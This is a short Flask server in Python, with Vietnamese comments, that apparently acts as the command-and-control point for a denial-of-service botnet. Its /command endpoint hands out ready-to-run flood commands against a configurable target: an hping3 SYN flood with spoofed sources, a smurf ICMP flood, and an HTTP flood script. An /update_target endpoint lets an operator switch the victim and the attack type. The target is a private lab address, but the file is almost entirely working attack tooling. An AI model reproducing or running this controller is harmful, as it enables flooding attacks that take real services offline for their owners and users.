from flask import Flask, request

app = Flask(__name__)

# Địa chỉ IP và thông số của máy mục tiêu
target_ip = "192.168.159.136"
target_port = 8080
attack_type = "http_flood"  # Loại tấn công: "syn_flood", "smurf", "http_flood"

@app.route('/command', methods=['GET'])
def command():
    if attack_type == "syn_flood":
        return f"hping3 {target_ip} -p {target_port} -S --flood --rand-source"
    elif attack_type == "smurf":
        return f"hping3 {target_ip} --icmp --spoof {target_ip} --flood"
    elif attack_type == "http_flood":
        return f"python3 http_flood.py http://{target_ip}:{target_port}"
    else:
        return "Invalid attack type"

@app.route('/update_target', methods=['POST'])
def update_target():
    global target_ip, target_port, attack_type
    try:
        data = request.json
        target_ip = data.get("ip", target_ip)
        target_port = data.get("port", target_port)
        attack_type = data.get("attack_type", attack_type)
        return "Target updated successfully!"
    except Exception as e:
        return f"Error updating target: {e}", 400

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
